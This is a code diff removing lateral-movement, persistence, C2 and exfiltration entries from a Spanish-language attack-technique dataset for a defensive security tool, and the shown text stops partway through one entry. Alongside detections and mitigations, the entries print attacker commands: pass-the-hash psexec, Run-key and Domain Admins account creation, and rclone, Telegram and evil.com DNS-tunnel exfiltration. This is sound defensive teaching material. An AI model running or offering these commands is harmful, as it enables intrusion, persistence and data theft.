@@ -1,411 +1,25 @@
-// attacks/misc.ts — dataset de ATAQUES: Lateral, Persistencia/C2/Exfil, Social y Malware.
+// attacks/misc.ts — dataset de ATAQUES: Social y Malware / C2 / Exfiltración.
 //
 // Parte del dataset de VaultNotes "Ataques" (100% offline — alimenta
-// AttacksExplorerTool.tsx vía ./index.ts). Este archivo cubre la parte del
-// kill-chain que va DESPUÉS del acceso: cómo se mueven (LAT), cómo se quedan y
-// sacan los datos (PER), cómo engañan a humanos (SE) y el software malicioso
-// que lo hace posible (MAL). La perspectiva es la del operador (red team):
-// herramientas, comandos e IOCs reales; y la del analista (SOC): señales y
-// eventos.
+// AttacksExplorerTool.tsx vía ./index.ts). Este archivo cubre el fraude a
+// humanos (SE) y el software malicioso + canales de salida (MAL: malware,
+// C2 y exfiltración).
 //
-// IDs: LAT-001..004 (Lateral), PER-001..008 (Persistencia), SE-001..009
-// (Social), MAL-001..007 (Malware). No usar `export default`.
-// Los sinónimos (piggybacking, whaling, quishing, CEO fraud…) van en `alias`
-// de la entrada canónica — NUNCA como entrada propia.
-// Las detecciones son ejemplos de partida: ajústalos a tu entorno (nombres de
-// tablas, tenants, naming conventions).
+// REGLA ANTI-DUPLICADO: las técnicas de persistencia (Run keys, WMI event
+// subscriptions, tareas programadas, servicios, GPO, cuentas shadow admin,
+// reglas de Outlook, LOLBins/fileless, rootkits/bootkits) y las de
+// movimiento lateral (SMB/WinRM/PSExec, RDP hijack, túneles SSH, RMM)
+// YA VIVEN en ../vulnerabilities.ts — NO se repiten aquí. Lo que sí vive
+// aquí: el malware como familia operativa (ransomware, supply chain,
+// infostealers, criptojacking, wipers, gusanos), el comportamiento C2
+// (beaconing) y la exfiltración por canales legítimos.
+//
+// IDs: SE-001..SE-009 (Social), MAL-001..MAL-008 (Malware/C2/Exfil).
+// No usar `export default`. Los sinónimos (piggybacking, whaling,
+// quishing, CEO fraud…) van en `alias` de la entrada canónica.
+// Las detecciones son ejemplos de partida: ajústalos a tu entorno.
 
 import type { AttackInfo } from './types';
-
-/* ============================ LATERAL / MOVIMIENTO ============================ */
-
-export const LAT_ATTACKS: AttackInfo[] = [
-  {
-    id: 'LAT-001',
-    nombre: 'Movimiento lateral (SMB / WinRM / WMI / PSExec / RDP)',
-    alias: ['remote services', 'remote execution', 'Impacket (psexec/wmiexec/atexec)', 'remote admin tooling'],
-    categoria: 'Lateral',
-    severidad: 'Critical',
-    mitre_attack: ['T1021', 'T1021.001', 'T1021.002', 'T1021.003', 'T1021.006'],
-    descripcion_tecnica: 'Ejecución remota entre hosts internos con los mismos protocolos y binarios que usa la administración legítima de Windows: SMB/ADMIN$ (PsExec), WinRM (winrs, PowerShell Remoting), WMI/DCOM (wmiexec) y RDP. Con credenciales válidas — o solo el hash NTLM (Pass-the-Hash) — cada host alcanzable es un trampolín al siguiente. Impacket (psexec.py, wmiexec.py, atexec.py, smbexec.py) es el kit estándar de los operadores de ransomware.',
-    impacto_iam_soc: 'Es EL tramo del kill-chain: de la estación de un usuario al file server, al backup y al DC. Para el SOC: logons 4624 type 3/10 entre hosts que nunca se hablan, instalación del servicio PSEXESVC (7045) y escrituras en ADMIN$/IPC$ fuera de ventanas de administración.',
-    como_funciona: [
-      'Obtener credenciales locales/admin (dump de LSASS, reuso de cuentas) o usar el NTLM hash directamente con Impacket: psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<ntlm> user@10.0.1.25',
-      'psexec.py sube PSEXESVC.exe a ADMIN$, lo registra como servicio (EventID 7045) y ejecuta la shell por el pipe SMB — huella: binario en ADMIN$, servicio efímero y 4624 type 3 con LogonProcessName NtLmSsp',
-      'wmiexec.py/atexec.py van por WMI/DCOM: el payload corre dentro de WmiPrvSE.exe sin dejar binario nuevo en disco (fileless desde el minuto uno)',
-      'WinRM (5985/5986) con winrs o PSRemoting (Register-PSSessionConfiguration) y RDP (3389) para acceso interactivo hacia servidores y estaciones con sesiones guardadas',
-    ],
-    deteccion: {
-      kql: 'SecurityEvent | where EventID == 4624 and LogonType in (3, 10) and not(TargetUserName endswith "$") | summarize cnt=count() by TargetUserName, IpAddress, bin(TimeGenerated, 1h) | where cnt > 20 | take 20 // más 7045 con binarios en ADMIN$/Temp',
-      spl: 'index=wineventlog sourcetype=WinEventLog:Security EventCode=4624 LogonType=3 | stats count by user, src, dest | where dest_type="server" | sort -count',
-      sigma: 'win_impacket_psexec (custom — wmiexec/atexec dejan cmd.exe /c con redirección a \\\\127.0.0.1\\ADMIN\\__output)',
-      win_event_ids: [4624, 4648, 5140, 7045],
-    },
-    mitigacion: [
-      'Tiering de cuentas (admin de estaciones ≠ admin de servidores ≠ Domain Admin) + LAPS: cada host con password local única y rotada',
-      'Firewall segmentado: bloquear workstation→workstation y limitar 5985/3389 a saltos de administración (bastión/PAW)',
-      'Alertar EID 7045 con ImagePath en ADMIN$\\Temp y logons type 3 atípicos entre subredes (correlación, no reglas por-IP)',
-      'Credential Guard + Protected Users para matar el Pass-the-Hash en origen; deshabilitar WinRM donde no se use',
-    ],
-    referencias: [
-      'https://attack.mitre.org/techniques/T1021/',
-      'https://github.com/fortra/impacket',
-      'https://learn.microsoft.com/en-us/sysinternals/downloads/psexec',
-    ],
-  },
-  {
-    id: 'LAT-002',
-    nombre: 'Secuestro de sesión RDP (tscon)',
-    alias: ['RDP session hijacking', 'tscon hijack', 'session shadowing no autorizado'],
-    categoria: 'Lateral',
-    severidad: 'High',
-    mitre_attack: ['T1563.002'],
-    descripcion_tecnica: 'Estando SYSTEM en un host con RDP habilitado, tscon.exe puede reconectar una sesión desconectada de OTRO usuario a la consola local SIN conocer su contraseña: el token de sesión ya está vivo y Windows no re-valida credenciales. El atacante hereda un escritorio desbloqueado, con Outlook, shares mapeados y SSO corporativo ya cargados.',
-    impacto_iam_soc: 'Se salta la autenticación por completo: hay actividad "del usuario" sin login nuevo (sin 4624 con su cuenta). Casi invisible salvo que se audite tscon.exe/quser.exe lanzados por procesos de servicio (sqlservr.exe, svchost) — la ventana típica es un SQL Server explotado vía xp_cmdshell.',
-    como_funciona: [
-      'Conseguir SYSTEM en un host con sesiones RDP desconectadas: quser lista las sesiones en estado "Disc" con su ID (rdp-tcp#N)',
-      'tscon <ID> /dest:console reconecta la sesión de la víctima a la consola física/virtual — como SYSTEM no se le pide password',
-      'Resultado: escritorio desbloqueado del usuario, aplicaciones abiertas, cookies y tokens de sesión vivos — sin un solo evento de logon nuevo de esa cuenta',
-      'Variante RDS/VDI: mismo truco en servidores de terminal para heredar sesiones de administradores incautos que "desconectan" en vez de cerrar sesión',
-    ],
-    deteccion: {
-      kql: 'DeviceProcessEvents | where FileName in~ ("tscon.exe", "quser.exe", "qwinsta.exe") or ProcessCommandLine has "/dest:console" | project TimeGenerated, DeviceName, ProcessCommandLine, InitiatingProcessFileName | take 10 // rojo si el padre es sqlservr.exe/svchost.exe',
-      spl: 'index=win EventCode=4688 | search "tscon" OR "qwinsta" | table _time, host, NewProcessName, CommandLine | where CommandLine LIKE "%/dest%"',
-      sigma: 'win_rdp_hijack_tscon (custom)',
-      win_event_ids: [4778, 4779],
-    },
-    mitigacion: [
-      'GPO "Set time limit for disconnected sessions" corto + "On disconnected sessions: lock" — la sesión reconectada aparece bloqueada',
-      'Proteger los servicios que regalan SYSTEM (xp_cmdshell deshabilitado, agentes de backup y tasks con cmd) — sin SYSTEM no hay tscon',
-      'Alertar tscon.exe/quser.exe iniciado por procesos de servicio y las sesiones 4778 que cambian de estación sin logon previo',
-      'Cultura de "logoff, no disconnect" en admins + denegar RDP a cuentas de servicio (Deny logon through Remote Desktop Services)',
-    ],
-    referencias: [
-      'https://attack.mitre.org/techniques/T1563/002/',
-      'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/rdp-sessions-hijacking',
-    ],
-  },
-  {
-    id: 'LAT-003',
-    nombre: 'Pivoting y túneles (SSH / chisel / proxychains)',
-    alias: ['tunneling', 'port forwarding', 'SOCKS proxy interno', 'ligolo-ng'],
-    categoria: 'Lateral',
-    severidad: 'High',
-    mitre_attack: ['T1090.001', 'T1090.003'],
-    descripcion_tecnica: 'Una vez con foothold, el host comprometido se convierte en puerta de la red interna: túneles SSH (-L local, -R reverso, -D SOCKS dinámico), chisel (túnel reverso sobre HTTP/WebSocket que atraviesa proxies corporativos), ligolo-ng (interfaz TUN, sin puertos a la escucha), proxychains para encadenar herramientas, y frp/ngrok para exponer servicios internos hacia fuera.',
-    impacto_iam_soc: 'El perímetro deja de existir: nmap, crackmapexec y Impacket corren "desde dentro" a través del SOCKS sin tocar los firewalls. Para el SOC: binarios raros a la escucha en 1080/8000, conexiones persistentes de horas a un único destino externo y tráfico de baja tasa pero continuo.',
-    como_funciona: [
-      'ssh -D 1080 user@host-comprometido crea un SOCKS5 en el equipo del atacante; proxychains4 nmap -sT 10.0.0.0/24 pivota por él',
-      'chisel: server en un VPS + chisel client --reverse "R:socks" en la víctima — el túnel viaja como HTTP/WebSocket saliente y sortea el proxy de la corp',
-      'ligolo-ng levanta una interfaz TUN en el atacante y enruta subredes enteras con rendimiento casi nativo (el estándar moderno de red team)',
-      'El túnel se persiste como servicio (EID 7045) o tarea programada para sobrevivir reinicios — es infraestructura, no un one-shot',
-    ],
-    deteccion: {
-      kql: 'DeviceProcessEvents | where FileName in~ ("chisel.exe", "ligolo.exe", "frpc.exe", "ngrok.exe") or (FileName in~ ("ssh.exe", "plink.exe") and ProcessCommandLine has_any (" -D", " -L", " -R")) | take 10 // y DeviceNetworkEvents: conexiones > 1h al mismo RemoteUrl',
-      spl: 'index=net sourcetype=flow | stats sum(duration) as total, count by src, dest | where total > 3600 | sort - total // sesiones de horas con poco volumen = túnel',
-      sigma: 'win_tool_tunneling_chisel (custom)',
-    },
-    mitigacion: [
-      'Egress filtering con allowlist: los endpoints solo hablan a destinos inventariados — mata túneles por defecto (chisel/ngrok no pasan)',
-      'Bloquear el forwarding saliente: SSH AllowTcpForwarding no fuera de bastiones y TLS inspection para detectar websockets de chisel',
-      'Alertar sobre procesos con sockets a la escucha que no sean del inventario y sobre binarios firmados-no conocidos (ligolo/frpc)',
-      'Segmentación + NAC: un host de VLAN de usuarios no debería poder abrir SOCKS hacia VLANs de servidores',
-    ],
-    referencias: [
-      'https://attack.mitre.org/techniques/T1090/001/',
-      'https://github.com/jpillora/chisel',
-      'https://github.com/nicocha30/ligolo-ng',
-    ],
-  },
-  {
-    id: 'LAT-004',
-    nombre: 'Abuso de herramientas RMM (AnyDesk / ScreenConnect)',
-    alias: ['RMM abuse', 'remote monitoring and management', 'TeamViewer / RustDesk / Splashtop', 'herramientas de acceso remoto legítimas'],
-    categoria: 'Lateral',
-    severidad: 'High',
-    mitre_attack: ['T1219'],
-    descripcion_tecnica: 'Instalación silenciosa de software de gestión remota legítimo (AnyDesk --silent-install, ScreenConnect/ConnectWise por MSI, TeamViewer, RustDesk) para obtener acceso gráfico total. El EDR lo tolera porque es binario firmado de empresas reales; los grupos de ransomware 2023-2025 (Black Basta, Akira, Royal, Play) lo usan como acceso estándar post-compromiso — muchas veces convenciendo por teléfono al helpdesk de que "lo instala un técnico".',
-    impacto_iam_soc: 'Acceso interactivo total con pocas señales: proceso firmado, protocolo propietario por 443, sin logons de Windows visibles. El patrón detectable no es una firma: es "RMM nuevo nunca visto en ese host" — solo se caza con inventario de software.',
-    como_funciona: [
-      'Fase de acceso: vishing al service desk ("soy del proveedor de AV, le instalo AnyDesk para la revisión") — el propio helpdesk instala y facilita el ID/contraseña no atendida',
-      'Fase post-explotación: desde una shell ya obtenida, AnyDesk.exe --silent-install o MSI de ScreenConnect /quiet con token del servidor del atacante',
-      'Se configura acceso no atendido (password fija) → sesión gráfica 24/7 que sobrevive a cambios de password de Windows',
-      'Desde el RMM: despliegue del ransomware, exfiltración y retornos durante semanas — living off legitimate software, sin escribir exploit nuevo',
-    ],
-    deteccion: {
-      kql: 'DeviceProcessEvents | where FileName in~ ("anydesk.exe", "teamviewer.exe", "rustdesk.exe", "screenconnect.windowsclient.exe") or ProcessCommandLine has_any ("--silent-install", "AnyDesk.msi", "ScreenConnect.msi") | take 20 // la detección real es por INVENTARIO: binario RMM no desplegado por TI',
-      spl: 'index=win EventCode=7045 | search "AnyDesk" OR "ScreenConnect" OR "ConnectWise" OR "TeamViewer" | stats count by host, ServiceName',
-      win_event_ids: [7045],
-    },
-    mitigacion: [
-      'WDAC/AppLocker con allowlist de ejecutables: los RMM no desplegados por TI no arrancan — control determinista, no reputacional',
-      'Bloquear en el proxy/SWG los dominios de control de RMM no contratados (anydesk.com, *.screenconnect.com, rustdesk.com) y el registro MSI silencioso',
-      'Proceso formal: TI nunca instala nada bajo presión telefónica — callback al número registrado del proveedor antes de tocar un equipo',
-      'Alerta de "nuevo binario/servicio RMM" comparando contra el asset inventory (CMDB) y revisión de acceso no atendido activo',
-    ],
-    referencias: [
-      'https://attack.mitre.org/techniques/T1219/',
-      'https://www.cisa.gov/stopransomware',
-    ],
-  },
-];
-
-/* ====================== PERSISTENCIA / C2 / EXFILTRACIÓN ====================== */
-
-export const PER_ATTACKS: AttackInfo[] = [
-  {
-    id: 'PER-001',
-    nombre: 'Persistencia en registro y autoarranque (Run keys / Startup)',
-    alias: ['Run keys', 'RunOnce', 'carpeta Startup', 'autorun de registro'],
-    categoria: 'Persistencia',
-    severidad: 'High',
-    mitre_attack: ['T1547.001'],
-    descripcion_tecnica: 'El clásico autorun: el malware se registra para ejecutarse en cada login/boot mediante Run/RunOnce (HKCU o HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) o la carpeta Startup (%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup con un .lnk/.bat). Para HKCU basta el permiso del usuario comprometido; el valor apunta a un loader en %AppData% que descarga y stagea el implant principal.',
-    impacto_iam_soc: 'Reiniciar no cura nada: el implant vuelve en cada login con los privilegios de la víctima (o de SYSTEM si escribió HKLM). Para el SOC: valores Run nuevos fuera de ventanas de instalación, y rutas de ejecutables en %AppData%/%Temp%/%Public%.',
-    como_funciona: [
-      'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v OneSyncUpd /t REG_SZ /d "%AppData%\\Roam\\svc\\svc.exe" — o Set-ItemProperty desde PowerShell (menos ruido en logs de reg.exe)',
-      'RunOnce para ejecución única tras reboot; carpeta Startup con acceso directo como respaldo si borran la clave',
-      'El valor ejecuta un loader liviano que descarga/stagea el stager principal o hace DLL sideloading junto a un binario firmado de autoarranque',
-      'Con admin: la misma clave en HKLM persiste para TODOS los usuarios del host; variante RunOnce\\Approved y Winlogon\\Shell si hay EDR dormido',
-    ],
-    deteccion: {
-      kql: 'DeviceRegistryEvents | where RegistryKey contains "CurrentVersion\\Run" or RegistryKey contains "\\Startup\\" | where RegistryValueData has_any ("%AppData%", "%Public%", "C:\\Temp", "powershell") | project TimeGenerated, DeviceName, RegistryValueName, RegistryValueData, InitiatingProcessFileName | take 20',
-      spl: 'index=sysmon EventCode=13 | regex TargetObject=".*CurrentVersion\\\\Run.*" | stats count by host, Image | sort -count',
-      sigma: 'win_persistence_run_key (custom — Sysmon EID 12/13)',
-      win_event_ids: [11, 12, 13],
-    },
-    mitigacion: [
-      'Baseline con Sysinternals Autoruns y comparación periódica: en una flota sana las Run keys solo cambian cuando TI instala software',
-      'AppLocker/WDAC prohibiendo ejecución desde %AppData%/%Temp%/%Public% — la clave puede existir, el payload no arranca',
-      'Alertar nuevos valores Run cuya imagen/ruta no pertenezca a software inventariado, especialmente de noche',
-      'En respuesta: borrar clave Y cazar el binario stageado (la entrada sin payload es inofensiva pero señala la ruta del loader)',
-    ],
-    referencias: [
-      'https://attack.mitre.org/techniques/T1547/001/',
-      'https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns',
-    ],
-  },
-  {
-    id: 'PER-002',
-    nombre: 'Subscripciones de eventos WMI',
-    alias: ['WMI event subscription', 'MOF persistence', '__EventFilter → __CommandLineEventConsumer'],
-    categoria: 'Persistencia',
-    severidad: 'High',
-    mitre_attack: ['T1546.003'],
-    descripcion_tecnica: 'Persistencia sin archivo persistente: tres objetos WMI en root\\subscription — un __EventFilter (la condición: reboot, intervalo de 60s, evento concreto), un __CommandLineEventConsumer (el comando a ejecutar) y el __FilterToConsumerBinding que los une. Al dispararse el trigger, WMI ejecuta el comando como SYSTEM. Se instala con mofcomp.exe, wmic o PowerShell y vive en el repositorio CIM: no se va reinstalando aplicaciones.',
-    impacto_iam_soc: 'No hay binario autorun ni tarea programada visible: la lógica vive dentro del repositorio WMI. Sin Sysmon EID 19/20/21 no hay señal nativa — solo un dump/auditoría de root\\subscription revela el binding.',
-    como_funciona: [
-      'Crear el __EventFilter: p. ej. SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System" (cada 60s) o triggers de arranque (Startup/Boot)',
-      'Crear el __CommandLineEventConsumer con CommandLineTemplate = powershell -nop -w hidden -enc <base64> (stager recuperable en cualquier momento)',
-      'Bind: __FilterToConsumerBinding conecta filter y consumer — sin el binding no se dispara nunca; los tres caben en un .MOF compilado con mofcomp.exe',
-      'Instalación remota (wmiexec + registro de objetos por COM) o desde PowerShell (SpawnInstance de __EventFilter/__CommandLineEventConsumer en root\\subscription) — todo queda persistido en %SystemRoot%\\System32\\wbem\\Repository',
-    ],
-    deteccion: {
-      kql: 'DeviceProcessEvents | where FileName in~ ("mofcomp.exe", "scrcons.exe") or ProcessCommandLine has "__EventFilter" | take 10 // scrcons.exe (el host de los consumers) lanzando powershell = smoking gun; fuente primaria: Sysmon EID 19/20/21',
-      spl: 'index=sysmon EventCode IN (19, 20, 21) | stats count by host, Name, Type | sort -count',
-      sigma: 'sysmon_wmi_event_subscription (custom)',
-      win_event_ids: [19, 20, 21],
-    },
-    mitigacion: [
-      'Sysmon con eventos WMI habilitados (19/20/21) — sin él, esta persistencia es invisible para el SOC',
-      'Comparar dumps de root\\subscription contra un baseline de oro (exportar objetos y diff tras cada incidente o mensualmente)',
-      'EDR que alerte la creación de consumidores WMI y procesos hijos de scrcons.exe (nadie legítimo lanza PowerShell desde ahí)',
-      'En limpieza: borrar el trío completo (filter, consumer, binding) — dejar el consumer sin filtro es dejar la bomba sin detonador, no desactivarla',
-    ],
-    referencias: [
-      'https://attack.mitre.org/techniques/T1546/003/',
-      'https://pentestlab.blog/2020/01/13/persistence-wmi-event-subscription/',
-    ],
-  },
-  {
-    id: 'PER-003',
-    nombre: 'Persistencia vía GPO y tareas de dominio',
-    alias: ['GPO startup scripts', 'tareas programadas de dominio', 'SharpGPOAbuse', 'GPO abuse'],
-    categoria: 'Persistencia',
-    severidad: 'High',
-    mitre_attack: ['T1484.001', 'T1053.005'],
-    descripcion_tecnica: 'Con permisos de "Edit settings" sobre una GPO existente (delegación excesiva o DA comprometido), se inyecta un startup script o una immediate task maliciosa. La política se replica por SYSVOL a todos los DCs y se ejecuta como SYSTEM en cada máquina de la OU afectada al siguiente gpupdate/reboot: persistencia a escala de dominio, silenciosa y "legítima" — es el propio mecanismo de gestión el que despliega el malware.',
-    impacto_iam_soc: 'Una GPO comprometida = ejecución SYSTEM masiva con cada ciclo de refresco; apuntar a la OU de Domain Controllers = todos los DCs. Para el SOC: cambios de GroupPolicyContainer (5136) sin ticket de cambio, gpt.ini con Version subiendo sola y scripts nuevos en SYSVOL.',
-    como_funciona: [
-      'Enumerar GPOs editables por la cuenta comprometida (SharpGPOAbuse o PowerView Get-DomainGPO / Get-ObjectAcl sobre "gplink")',
-      'SharpGPOAbuse --AddImmediateTask --GPOName <gpo> con powershell -enc ... — modifica el XML en SYSVOL SIN crear una GPO nueva (menos ruido que New-GPO)',
-      'gpt.ini Version++ y la replicación DFS-R lleva el cambio a los DCs; gpupdate/reboot en las máquinas de la OU ejecuta la tarea como SYSTEM',
-      'Variantes: GPO startup script (\\Scripts\\Startup), GPO de preferencias con schtask, o nuevas GPOs enlazadas a la OU de los DCs — el "ataque de dominio silencioso" por excelencia',
-    ],
-    deteccion: {
-      kql: 'SecurityEvent | where EventID == 5136 and ObjectDN contains "CN={Policies" | project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName | take 20 // más EID 5145: escrituras en \\\\SYSVOL y diff de gpt.ini/Scripts',
-      spl: 'index=win EventCode=5136 | search "groupPolicyContainer" | table _time, host, SubjectUserName, ObjectDN | sort -_time',
-      win_event_ids: [5136, 5145, 4698],
-    },
-    mitigacion: [
-      'Auditar delegación de GPOs: quien edita políticas es tier-0 de facto — revisar ACLs de gPLink/GPMC y quitar "Edit settings" de no-admins',
-      'Alertar TODO cambio de GroupPolicyContainer fuera de ventana de cambio y diff automático de SYSVOL (gpt.ini, Scripts\\, .xml de tareas)',
-      'Backups/versionado de GPOs (Get-GPOReport semanal + comparación) para detectar el inmediato task inyectado',
-      'Tiering: solo PAWs administran GPOs; DA nunca edita políticas desde estaciones de usuario',
-    ],
-    referencias: [
-      'https://attack.mitre.org/techniques/T1484/001/',
-      'https://github.com/G0ldenGunSec/SharpGPOAbuse',
-    ],
-  },
-  {
-    id: 'PER-004',
-    nombre: 'Cuentas de persistencia (creación de admins)',
-    alias: ['cuentas doradas', 'golden account', 'cuenta admin fantasma', 'shadow admin'],
-    categoria: 'Persistencia',
-    severidad: 'High',
-    mitre_attack: ['T1136.002'],
-    descripcion_tecnica: 'Creación de cuentas de dominio diseñadas para parecer legítimas: nombre clonado de un admin o service account real (svc-bckup vs svc-backup), membership silencioso en grupos privilegiados, password never expires y sin uso inmediato. Quedan dormidas meses — el atacante las enciende cuando la remediación inicial "parece" terminada, o las reserva solo para tier-0.',
-    impacto_iam_soc: 'El IOC más traicionero: la cuenta ES válida y pasa todos los controles de login. Para el SOC: 4720 fuera del proceso JML, cuentas never-expires que no están en la CMDB, y logins esporádicos desde hosts atípicos mucho después del incidente "cerrado".',
-    como_funciona: [
-      'net user svc-helpdesk2 <pwd> /add /domain y net group "Domain Admins" svc-helpdesk2 /add — o New-ADUser + Add-ADGroupMember desde PowerShell',
-      'Mimetismo total: description/UPN/displayName copiados de una cuenta real de servicio para sobrevivir revisiones visuales y listados',
-      'Flags de invisibilidad: password never expires, sin mailbox (nada de expiraciones ni ruido), SmartcardRequired off, sin logon inicial',
-      'Uso diferido: semanas de inactividad y luego un login puntual hacia DCs/tier-0 — o rotación de nombre/SPN para pasar por otra cuenta de servicio',
-    ],
-    deteccion: {
-      kql: 'SecurityEvent | where EventID == 4720 | project TimeGenerated, TargetUserName, SubjectUserName, IpAddress | take 20 // cruzar con JML: alta sin ticket de RRHH/aprobación = incidente, no warning',
-      spl: 'index=win EventCode IN (4720, 4728, 4732) | table _time, EventCode, TargetUserName, SubjectUserName | sort -_time',
-      win_event_ids: [4720, 4728, 4732],
-    },
-    mitigacion: [
-      'JML estricto: altas SOLO con ticket aprobado; alerta SIEM automática de 4720 fuera de ventana de cambio o desde cuentas no-DA',
-      'Access reviews mensuales de Domain Admins/EA/schema admins con challenge de autorización (¿quién aprobó esta cuenta?)',
-      'Anomalías de atributos como regla: never-expires + lastLogon nulo + sin mailbox + creación reciente = revisión obligatoria',
-      'Honey: marcar "cuentas dormidas" conocidas y alertar cualquier autenticación suya (4768/4624) — son trampas perfectas',
-    ],
-    referencias: [
-      'https://attack.mitre.org/techniques/T1136/002/',
-      'https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720',
-    ],
-  },
-  {
-    id: 'PER-005',
-    nombre: 'Beaconing C2 (Cobalt Strike / Sliver)',
-    alias: ['beaconing', 'C2 check-in', 'malleable C2', 'Sliver / Mythic / Havoc'],
-    categoria: 'Persistencia',
-    severidad: 'Critical',
-    mitre_attack: ['T1071.001'],
-    descripcion_tecnica: 'El canal de vida del implant: check-ins HTTPS periódicos al teamserver con sleep/jitter configurables y perfiles malleable (Cobalt Strike) que disfrazan el tráfico como una web real — URIs, headers y user-agent de un SaaS conocido. Sliver, Mythic o Havoc siguen el mismo concepto. La infraestructura delante (redirectors, dominios fast-flux, proxies residenciales) hace que bloquear una IP no sirva de nada.',
-    impacto_iam_soc: 'Sin C2 no hay post-explotación: localizarlo es prioridad #1 del SOC. La firma no existe; la señal es la regularidad del intervalo: mismo dominio, mismo delta (±jitter), 24/7, desde uno o pocos hosts, con volúmenes mínimos por check-in.',
-    como_funciona: [
-      'El beacon duerme sleep segundos (p. ej. 60s) con jitter ±20% y hace GET/POST al teamserver o al redirector (nginx/CDN) que hay delante',
-      'El malleable profile transforma la metadata: cookies custom, URI /api/v2/get, headers de jquery.com — el tráfico "parece" una web legítima en el proxy',
-      'Infra: dominios fast-flux o pools residenciales rotando por reputación; redirectores desechables entre el beacon y el teamserver real',
-      'Modo dormant: sleep de horas tras lograr el objetivo — el beacon casi desaparece del tráfico y solo despierta para tareas',
-    ],
-    deteccion: {
-      kql: 'DeviceNetworkEvents | where RemotePort in (443, 8443) | summarize cnt=count(), hosts=dcount(DeviceName) by RemoteUrl, bin(TimeGenerated, 1h) | where cnt > 15 and hosts < 4 | take 20 // analizar la desviación del intervalo (delta_t) por URL: jitter bajo = beacon',
-      spl: 'index=proxy | streamstats current=f delta(_time) as dt by url | stats avg(dt) as media, stdev(dt) as jitter by url | where media < 3600 and jitter < 60 // RITA (activecm) automatiza exactamente esto',
-      sigma: 'net_conn_periodic_beaconing (custom)',
-    },
-    mitigacion: [
-      'Egress allowlist: endpoints corporativos solo hacia dominios categorizados — corta el C2 por defecto, no cuando ya es incidente',
-      'Análisis de periodicidad sobre proxy/Zscaler (RITA o equivalente) + alerta de "volumen bajo persistente" que los umbrales por-conteo ignoran',
-      'TLS inspection + fingerprinting JA3/JA4 para clientes no estándar (Python/Go del implant contra chrome real)',
-      'En respuesta: bloquear el dominio no basta — hay que cazar el proceso dormido en el host (timeline EDR, tareas programadas y PER-* asociadas)',
-    ],
-    referencias: [
-      'https://attack.mitre.org/techniques/T1071/001/',
-      'https://attack.mitre.org/software/S0154/',
-      'https://github.com/activecm/rita',
-    ],
-  },
-  {
-    id: 'PER-006',
-    nombre: 'Túneles DNS (C2 / exfiltración)',
-    alias: ['DNS tunneling', 'dnscat2', 'iodine', 'C2 sobre DNS'],
-    categoria: 'Persistencia',
-    severidad: 'Critical',
-    mitre_attack: ['T1071.004'],
-    descripcion_tecnica: 'C2 y exfiltración encapsulados en consultas DNS — el protocolo que casi toda red deja salir sin filtrar. El implante codifica datos en labels de subdominio (b64abc123xyz.tunel.evil.com) y el DNS autoritativo del atacante responde (a menudo en TXT) con comandos codificados. dnscat2 e iodine son las herramientas de referencia; el canal es lento pero atraviesa firewalls por defecto.',
-    impacto_iam_soc: 'El DNS es el agujero ciego del perímetro: los proxies no lo inspeccionan y pocos SOCs lo ingieren. La señal es estadística: un dominio con MILES de subdominios únicos por hora, labels largos y de alta entropía, y respuestas TXT frecuentes desde un mismo host.',
-    como_funciona: [
-      'iodine/dnscat2 client en el host interno → el servidor del atacante es el NS autoritativo de un dominio comprado para el túnel',
-      'Upstream: cada query "<datos>.evil.com" transporta un fragmento (labels de hasta 63 bytes, codificación base32/base64 — alta entropía)',
-      'Downstream: registros TXT/CNAME/MX largos devuelven comandos del operador; el rate del resolver marca el ancho de banda (slow but reliable)',
-      'Usos: C2 low&slow (shell interactiva), exfiltración de archivos pequeños (credenciales, claves) y beaconing de respaldo cuando HTTPS está bloqueado',
-    ],
-    deteccion: {
-      kql: 'DnsEvents | extend lbl = split(Name, ".")[0] | where strlen(lbl) > 30 | take 20 // y por dominio: dcount(Name) > 500/hora = túnel casi seguro; TXT: DeviceNetworkEvents hacia el NS del dominio',
-      spl: 'index=dns | stats dc(query) as subdoms, avg(eval(len(split(query, ".")[0]))) as lbl_len by domain | where subdoms > 1000 OR lbl_len > 40 | sort -subdoms',
-      sigma: 'dns_tunneling_detected_entropy (custom)',
-    },
-    mitigacion: [
-      'Resolver corporativo único con logging (no permitir 8.8.8.8 directo desde hosts) y bloqueo de resolución recursiva a terceros',
-      'Filtrar en el resolver: labels > 40-52 bytes, registros TXT largos, y dominios con NXDOMAIN ratios anómalos',
-      'Alertar dcount de subdominios por dominio (umbral agregado por hora) — la firma nunca llega, la estadística sí',
-      'Para servidores/tier-0: allowlist DNS estricta de los dominios que necesitan resolver',
-    ],
-    referencias: [
-      'https://attack.mitre.org/techniques/T1071/004/',
-      'https://code.kryo.se/iodine/',
-      'https://github.com/iagox86/dnscat2',
-    ],
-  },
-  {
-    id: 'PER-007',
-    nombre: 'Exfiltración por canales legítimos (cloud storage / correo)',
-    alias: ['exfiltración a cloud', 'rclone', 'MEGA/Dropbox/Telegram', 'exfil por canales permitidos'],
-    categoria: 'Persistencia',
-    severidad: 'High',
-    mitre_attack: ['T1567.002'],
-    descripcion_tecnica: 'Sacar los datos por servicios que el proxy ya permite: rclone contra MEGA/Dropbox/S3 (la navaja suiza del playbook de ransomware: multihilo, reanudable, logs amables), bots de Telegram (api.telegram.org/sendDocument), OneDrive/Drive del propio tenant o simplemente correos con adjuntos hacia webmails personales. Al DLP le cuesta distinguirlo del uso legítimo.',
-    impacto_iam_soc: 'Es el primer golpe de la doble extorsión: los datos ya están fuera ANTES del cifrado. Para el SOC: user-agent rclone/vX en el proxy, pico de upload sostenido a un solo dominio cloud, transferencias SMB masivas previas de stageo (5140/5145) o un bot de Telegram que nadie registró.',
-    como_funciona: [
-      'rclone config con backend mega/dropbox + rclone copy "C:\\Shares\\Finanzas" remote:fin -P — el estándar del playbook Conti y sucesores',
-      'Telegram: POST a api.telegram.org/bot<token>/sendDocument con el zip — se camufla como tráfico de mensajería normal',
-      'Stageo previo por SMB: movimiento de terabytes hacia un share poco usado antes de la subida (transferencias SMB grandes, EID 5140/5145)',
